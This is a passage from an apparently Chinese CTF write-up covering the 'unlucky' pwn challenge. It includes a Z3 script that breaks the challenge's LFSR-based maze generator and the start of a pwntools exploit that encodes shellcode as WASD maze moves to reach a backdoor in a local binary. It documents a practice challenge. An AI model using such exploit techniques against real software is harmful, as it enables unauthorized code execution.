<a id="__codelineno-15-40" name="__codelineno-15-40" href="#__codelineno-15-40"></a><span class="sd">    lw x10,28(x1)</span>
<a id="__codelineno-15-41" name="__codelineno-15-41" href="#__codelineno-15-41"></a><span class="sd">    lw x11,32(x1)</span>
<a id="__codelineno-15-42" name="__codelineno-15-42" href="#__codelineno-15-42"></a><span class="sd">    lw x12,36(x1)</span>
<a id="__codelineno-15-43" name="__codelineno-15-43" href="#__codelineno-15-43"></a><span class="sd">    lw x13,40(x1)</span>
<a id="__codelineno-15-44" name="__codelineno-15-44" href="#__codelineno-15-44"></a><span class="sd">    lw x14,44(x1)</span>
<a id="__codelineno-15-45" name="__codelineno-15-45" href="#__codelineno-15-45"></a>
<a id="__codelineno-15-46" name="__codelineno-15-46" href="#__codelineno-15-46"></a>
<a id="__codelineno-15-47" name="__codelineno-15-47" href="#__codelineno-15-47"></a><span class="sd">.data</span>
<a id="__codelineno-15-48" name="__codelineno-15-48" href="#__codelineno-15-48"></a><span class="sd">variable:</span>
<a id="__codelineno-15-49" name="__codelineno-15-49" href="#__codelineno-15-49"></a><span class="sd">    .word 0xdeadbeef</span>
<a id="__codelineno-15-50" name="__codelineno-15-50" href="#__codelineno-15-50"></a><span class="sd">&#39;&#39;&#39;</span>
</code></pre></div></p>
<h3 id="unlucky">unlucky<a class="headerlink" href="#unlucky" title="Permanent link">&para;</a></h3>
<p><strong>一血</strong></p>
<p>就是输入seed，根据seed生成迷宫，然后迷宫走出去就可以根据我们的路径来以一定规则转换成代码并执行，也就是我们的shellcode要能过验证。思路就是我们要创建能够过验证的shellcode，最短的就是
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">pop</span><span class="w"> </span><span class="n">rax</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">sub</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="m">1311</span>
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">call</span><span class="w"> </span><span class="n">rax</span>
</code></pre></div>
这个短且很少有连续一样的方向，但是问题现在就是，要找好的迷宫来做这个事情，后面hint放出，prng有问题，直接找AI写个脚本帮我生成好的迷宫，刚开始想要全空，但是发现不行，g随后一直尝试，找到了一个最下面四行全空的seed，生成脚本如下
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="ch">#!/usr/bin/env python3</span>
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">z3</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="k">def</span><span class="w"> </span><span class="nf">solve_half_empty_maze</span><span class="p">():</span>
<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>    <span class="c1"># 1. 定义 Seed</span>
<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>    <span class="n">seed</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;seed&#39;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>    <span class="n">state</span> <span class="o">=</span> <span class="n">seed</span>
<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>    <span class="n">solver</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Constraints: Rows 4, 5, 6, 7 (Bottom Half) must be EMPTY.&quot;</span><span class="p">)</span>
<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Total constraints: 32 bits fixed / 64 bits entropy.&quot;</span><span class="p">)</span>
<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>    <span class="c1"># -------------------------------------------</span>
<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>    <span class="c1"># 模拟 LFSR (必须严格匹配题目 sub_12C3)</span>
<a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>    <span class="c1"># -------------------------------------------</span>
<a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">symbolic_step</span><span class="p">(</span><span class="n">st</span><span class="p">):</span>
<a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>        <span class="c1"># 提取关键位</span>
<a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>        <span class="n">b33</span> <span class="o">=</span> <span class="n">LShR</span><span class="p">(</span><span class="n">st</span><span class="p">,</span> <span class="mi">33</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span>
<a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>        <span class="n">b60</span> <span class="o">=</span> <span class="n">LShR</span><span class="p">(</span><span class="n">st</span><span class="p">,</span> <span class="mi">60</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span>
<a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>        <span class="n">b63</span> <span class="o">=</span> <span class="n">LShR</span><span class="p">(</span><span class="n">st</span><span class="p">,</span> <span class="mi">63</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="c1"># (qword &lt; 0) is Bit 63</span>
<a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>        <span class="n">b8</span>  <span class="o">=</span> <span class="n">LShR</span><span class="p">(</span><span class="n">st</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>  <span class="o">&amp;</span> <span class="mi">1</span> <span class="c1"># BYTE1 &amp; 1 is Bit 8</span>
<a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>
<a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>        <span class="n">feedback</span> <span class="o">=</span> <span class="n">b33</span> <span class="o">^</span> <span class="n">b60</span> <span class="o">^</span> <span class="n">b63</span> <span class="o">^</span> <span class="n">b8</span>
<a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>
<a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>        <span class="c1"># 输出值 v1 = state &amp; 1</span>
<a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a>        <span class="n">val</span> <span class="o">=</span> <span class="n">st</span> <span class="o">&amp;</span> <span class="mi">1</span>
<a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>
<a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a>        <span class="c1"># 更新状态</span>
<a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>        <span class="n">new_st</span> <span class="o">=</span> <span class="n">LShR</span><span class="p">(</span><span class="n">st</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">feedback</span> <span class="o">&lt;&lt;</span> <span class="mi">63</span><span class="p">)</span>
<a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a>
<a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a>        <span class="k">return</span> <span class="n">val</span><span class="p">,</span> <span class="n">new_st</span>
<a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>
<a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a>    <span class="c1"># [A] 预热 64 次</span>
<a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
<a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a>        <span class="n">_</span><span class="p">,</span> <span class="n">state</span> <span class="o">=</span> <span class="n">symbolic_step</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
<a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a>
<a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a>    <span class="c1"># [B] 模拟生成循环</span>
<a id="__codelineno-17-38" name="__codelineno-17-38" href="#__codelineno-17-38"></a>    <span class="n">constraints_count</span> <span class="o">=</span> <span class="mi">0</span>
<a id="__codelineno-17-39" name="__codelineno-17-39" href="#__codelineno-17-39"></a>
<a id="__codelineno-17-40" name="__codelineno-17-40" href="#__codelineno-17-40"></a>    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>      <span class="c1"># Row 0-7 (0 is Top, 7 is Bottom)</span>
<a id="__codelineno-17-41" name="__codelineno-17-41" href="#__codelineno-17-41"></a>        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>  <span class="c1"># Col 0-7</span>
<a id="__codelineno-17-42" name="__codelineno-17-42" href="#__codelineno-17-42"></a>
<a id="__codelineno-17-43" name="__codelineno-17-43" href="#__codelineno-17-43"></a>            <span class="c1"># 跳过起点(7,0) 和 终点(0,7) - 这一步也会消耗随机数</span>
<a id="__codelineno-17-44" name="__codelineno-17-44" href="#__codelineno-17-44"></a>            <span class="n">is_reserved</span> <span class="o">=</span> <span class="p">(</span><span class="n">k</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">j</span> <span class="o">==</span> <span class="mi">7</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">k</span> <span class="o">==</span> <span class="mi">7</span> <span class="ow">and</span> <span class="n">j</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-17-45" name="__codelineno-17-45" href="#__codelineno-17-45"></a>
<a id="__codelineno-17-46" name="__codelineno-17-46" href="#__codelineno-17-46"></a>            <span class="k">if</span> <span class="ow">not</span> <span class="n">is_reserved</span><span class="p">:</span>
<a id="__codelineno-17-47" name="__codelineno-17-47" href="#__codelineno-17-47"></a>                <span class="n">val</span><span class="p">,</span> <span class="n">state</span> <span class="o">=</span> <span class="n">symbolic_step</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
<a id="__codelineno-17-48" name="__codelineno-17-48" href="#__codelineno-17-48"></a>
<a id="__codelineno-17-49" name="__codelineno-17-49" href="#__codelineno-17-49"></a>                <span class="c1"># [核心约束]</span>
<a id="__codelineno-17-50" name="__codelineno-17-50" href="#__codelineno-17-50"></a>                <span class="c1"># 如果行号 &gt;= 4 (即 4, 5, 6, 7 行)，必须是路 (1)</span>
<a id="__codelineno-17-51" name="__codelineno-17-51" href="#__codelineno-17-51"></a>                <span class="k">if</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">4</span><span class="p">:</span>
<a id="__codelineno-17-52" name="__codelineno-17-52" href="#__codelineno-17-52"></a>                    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
<a id="__codelineno-17-53" name="__codelineno-17-53" href="#__codelineno-17-53"></a>                    <span class="n">constraints_count</span> <span class="o">+=</span> <span class="mi">1</span>
<a id="__codelineno-17-54" name="__codelineno-17-54" href="#__codelineno-17-54"></a>
<a id="__codelineno-17-55" name="__codelineno-17-55" href="#__codelineno-17-55"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Constraints added: </span><span class="si">{</span><span class="n">constraints_count</span><span class="si">}</span><span class="s2">. Solving with Z3...&quot;</span><span class="p">)</span>
<a id="__codelineno-17-56" name="__codelineno-17-56" href="#__codelineno-17-56"></a>
<a id="__codelineno-17-57" name="__codelineno-17-57" href="#__codelineno-17-57"></a>    <span class="c1"># -------------------------------------------</span>
<a id="__codelineno-17-58" name="__codelineno-17-58" href="#__codelineno-17-58"></a>    <span class="c1"># 求解</span>
<a id="__codelineno-17-59" name="__codelineno-17-59" href="#__codelineno-17-59"></a>    <span class="c1"># -------------------------------------------</span>
<a id="__codelineno-17-60" name="__codelineno-17-60" href="#__codelineno-17-60"></a>    <span class="k">if</span> <span class="n">solver</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
<a id="__codelineno-17-61" name="__codelineno-17-61" href="#__codelineno-17-61"></a>        <span class="n">model</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
<a id="__codelineno-17-62" name="__codelineno-17-62" href="#__codelineno-17-62"></a>        <span class="n">magic_seed</span> <span class="o">=</span> <span class="n">model</span><span class="p">[</span><span class="n">seed</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
<a id="__codelineno-17-63" name="__codelineno-17-63" href="#__codelineno-17-63"></a>
<a id="__codelineno-17-64" name="__codelineno-17-64" href="#__codelineno-17-64"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
<a id="__codelineno-17-65" name="__codelineno-17-65" href="#__codelineno-17-65"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] FOUND SUPER SEED: </span><span class="si">{</span><span class="n">magic_seed</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-17-66" name="__codelineno-17-66" href="#__codelineno-17-66"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Hex: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">magic_seed</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-17-67" name="__codelineno-17-67" href="#__codelineno-17-67"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
<a id="__codelineno-17-68" name="__codelineno-17-68" href="#__codelineno-17-68"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] The bottom half of the maze (Rows 4-7) is now a giant open field.&quot;</span><span class="p">)</span>
<a id="__codelineno-17-69" name="__codelineno-17-69" href="#__codelineno-17-69"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] You can perform your entire shellcode dance there.&quot;</span><span class="p">)</span>
<a id="__codelineno-17-70" name="__codelineno-17-70" href="#__codelineno-17-70"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Once finished, just walk Up/Right to the exit.&quot;</span><span class="p">)</span>
<a id="__codelineno-17-71" name="__codelineno-17-71" href="#__codelineno-17-71"></a>
<a id="__codelineno-17-72" name="__codelineno-17-72" href="#__codelineno-17-72"></a>        <span class="k">return</span> <span class="n">magic_seed</span>
<a id="__codelineno-17-73" name="__codelineno-17-73" href="#__codelineno-17-73"></a>    <span class="k">else</span><span class="p">:</span>
<a id="__codelineno-17-74" name="__codelineno-17-74" href="#__codelineno-17-74"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] UNSAT. Even Z3 couldn&#39;t force 32 straight ones (unlikely).&quot;</span><span class="p">)</span>
<a id="__codelineno-17-75" name="__codelineno-17-75" href="#__codelineno-17-75"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;    If this happens, try reducing to 3 rows (j &gt;= 5).&quot;</span><span class="p">)</span>
<a id="__codelineno-17-76" name="__codelineno-17-76" href="#__codelineno-17-76"></a>
<a id="__codelineno-17-77" name="__codelineno-17-77" href="#__codelineno-17-77"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
<a id="__codelineno-17-78" name="__codelineno-17-78" href="#__codelineno-17-78"></a>    <span class="n">solve_half_empty_maze</span><span class="p">()</span>
</code></pre></div>
得到种子</p>
<p><code>7785659896892777472</code>
随后还要插入一些能够不影响关键步骤的指令，来调整位置，总结如下
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">rex</span><span class="w"> </span><span class="c1">#右移一格后向上三格</span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">rex.W</span><span class="w"> </span><span class="c1">#右移一个向上一格</span>
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="n">clc</span><span class="c1"># 右移两格</span>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">rex.WB</span><span class="w"> </span><span class="c1">#左移两格</span>
</code></pre></div>
插入一定量的<code>"gadget"</code>来调整位置，随后拿下，脚本如下
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">backdoor</span><span class="o">=</span><span class="mh">0x12a9</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">ret</span><span class="o">=</span><span class="mh">0x17c8</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="n">pre_shellcode</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="s1">pop rax</span>
<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="s1">sub rax,1311</span>
<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="s1">call rax</span>
<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="n">shellcode</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a><span class="s1">rex.X</span>
<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>
<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a><span class="s1">pop rax</span>
<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a><span class="s1">clc</span>
<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a><span class="s1">rex.X</span>
<a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a><span class="s1">sub ax,1311</span>
<a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a><span class="s1">call rax</span>
<a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>
<a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a>
<a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a><span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a><span class="s1">b mmap</span>
<a id="__codelineno-19-24" name="__codelineno-19-24" href="#__codelineno-19-24"></a><span class="s1">c</span>
<a id="__codelineno-19-25" name="__codelineno-19-25" href="#__codelineno-19-25"></a><span class="s1">c</span>
<a id="__codelineno-19-26" name="__codelineno-19-26" href="#__codelineno-19-26"></a><span class="s1">c</span>
<a id="__codelineno-19-27" name="__codelineno-19-27" href="#__codelineno-19-27"></a><span class="s1">c</span>
<a id="__codelineno-19-28" name="__codelineno-19-28" href="#__codelineno-19-28"></a><span class="s1">c</span>
<a id="__codelineno-19-29" name="__codelineno-19-29" href="#__codelineno-19-29"></a><span class="s1">c</span>
<a id="__codelineno-19-30" name="__codelineno-19-30" href="#__codelineno-19-30"></a><span class="s1">c</span>
<a id="__codelineno-19-31" name="__codelineno-19-31" href="#__codelineno-19-31"></a><span class="s1">c</span>
<a id="__codelineno-19-32" name="__codelineno-19-32" href="#__codelineno-19-32"></a><span class="s1">c</span>
<a id="__codelineno-19-33" name="__codelineno-19-33" href="#__codelineno-19-33"></a><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-19-34" name="__codelineno-19-34" href="#__codelineno-19-34"></a><span class="c1">#p=gdb.debug(&quot;./vuln&quot;,gdbscript=gdbscript)</span>
<a id="__codelineno-19-35" name="__codelineno-19-35" href="#__codelineno-19-35"></a><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./vuln&quot;</span><span class="p">)</span>
<a id="__codelineno-19-36" name="__codelineno-19-36" href="#__codelineno-19-36"></a><span class="c1">#p=remote(&#39;127.0.0.1&#39;,57826)</span>
<a id="__codelineno-19-37" name="__codelineno-19-37" href="#__codelineno-19-37"></a><span class="k">def</span><span class="w"> </span><span class="nf">wasd_to_asm</span><span class="p">(</span><span class="n">wasd_str</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">):</span>
<a id="__codelineno-19-38" name="__codelineno-19-38" href="#__codelineno-19-38"></a>    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="n">arch</span>
<a id="__codelineno-19-39" name="__codelineno-19-39" href="#__codelineno-19-39"></a>    <span class="n">mapping</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;w&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">}</span>
<a id="__codelineno-19-40" name="__codelineno-19-40" href="#__codelineno-19-40"></a>    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
<a id="__codelineno-19-41" name="__codelineno-19-41" href="#__codelineno-19-41"></a>
<a id="__codelineno-19-42" name="__codelineno-19-42" href="#__codelineno-19-42"></a>    <span class="c1"># 每4个字符转为1个字节</span>
<a id="__codelineno-19-43" name="__codelineno-19-43" href="#__codelineno-19-43"></a>    <span class="c1"># 忽略末尾不足4个字符的部分</span>
<a id="__codelineno-19-44" name="__codelineno-19-44" href="#__codelineno-19-44"></a>    <span class="n">limit</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">wasd_str</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">wasd_str</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>
<a id="__codelineno-19-45" name="__codelineno-19-45" href="#__codelineno-19-45"></a>
<a id="__codelineno-19-46" name="__codelineno-19-46" href="#__codelineno-19-46"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">limit</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
<a id="__codelineno-19-47" name="__codelineno-19-47" href="#__codelineno-19-47"></a>        <span class="n">c</span> <span class="o">=</span> <span class="n">wasd_str</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
<a id="__codelineno-19-48" name="__codelineno-19-48" href="#__codelineno-19-48"></a>        <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-19-49" name="__codelineno-19-49" href="#__codelineno-19-49"></a>            <span class="n">byte_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">mapping</span><span class="p">[</span><span class="n">c</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> \
<a id="__codelineno-19-50" name="__codelineno-19-50" href="#__codelineno-19-50"></a>                       <span class="p">(</span><span class="n">mapping</span><span class="p">[</span><span class="n">c</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">|</span> \
<a id="__codelineno-19-51" name="__codelineno-19-51" href="#__codelineno-19-51"></a>                       <span class="p">(</span><span class="n">mapping</span><span class="p">[</span><span class="n">c</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">|</span> \
<a id="__codelineno-19-52" name="__codelineno-19-52" href="#__codelineno-19-52"></a>                       <span class="n">mapping</span><span class="p">[</span><span class="n">c</span><span class="p">[</span><span class="mi">3</span><span class="p">]]</span>
<a id="__codelineno-19-53" name="__codelineno-19-53" href="#__codelineno-19-53"></a>            <span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte_val</span><span class="p">)</span>
<a id="__codelineno-19-54" name="__codelineno-19-54" href="#__codelineno-19-54"></a>        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
<a id="__codelineno-19-55" name="__codelineno-19-55" href="#__codelineno-19-55"></a>            <span class="k">continue</span> <span class="c1"># 跳过非 wasd 字符</span>
<a id="__codelineno-19-56" name="__codelineno-19-56" href="#__codelineno-19-56"></a>
<a id="__codelineno-19-57" name="__codelineno-19-57" href="#__codelineno-19-57"></a>    <span class="k">return</span> <span class="n">disasm</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<a id="__codelineno-19-58" name="__codelineno-19-58" href="#__codelineno-19-58"></a><span class="k">def</span><span class="w"> </span><span class="nf">shellcode_to_wasd</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
<a id="__codelineno-19-59" name="__codelineno-19-59" href="#__codelineno-19-59"></a>    <span class="c1"># 映射表: 00-&gt;w, 01-&gt;d, 10-&gt;s, 11-&gt;a</span>
<a id="__codelineno-19-60" name="__codelineno-19-60" href="#__codelineno-19-60"></a>    <span class="c1"># 对应数组索引 0, 1, 2, 3</span>
<a id="__codelineno-19-61" name="__codelineno-19-61" href="#__codelineno-19-61"></a>    <span class="n">mapping</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">]</span>
<a id="__codelineno-19-62" name="__codelineno-19-62" href="#__codelineno-19-62"></a>
<a id="__codelineno-19-63" name="__codelineno-19-63" href="#__codelineno-19-63"></a>    <span class="n">path</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
<a id="__codelineno-19-64" name="__codelineno-19-64" href="#__codelineno-19-64"></a>    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
<a id="__codelineno-19-65" name="__codelineno-19-65" href="#__codelineno-19-65"></a>        <span class="c1"># 依次提取 byte 的 7-6, 5-4, 3-2, 1-0 位</span>
<a id="__codelineno-19-66" name="__codelineno-19-66" href="#__codelineno-19-66"></a>        <span class="n">path</span> <span class="o">+=</span> <span class="n">mapping</span><span class="p">[(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]</span>
<a id="__codelineno-19-67" name="__codelineno-19-67" href="#__codelineno-19-67"></a>        <span class="n">path</span> <span class="o">+=</span> <span class="n">mapping</span><span class="p">[(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]</span>
<a id="__codelineno-19-68" name="__codelineno-19-68" href="#__codelineno-19-68"></a>        <span class="n">path</span> <span class="o">+=</span> <span class="n">mapping</span><span class="p">[(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]</span>
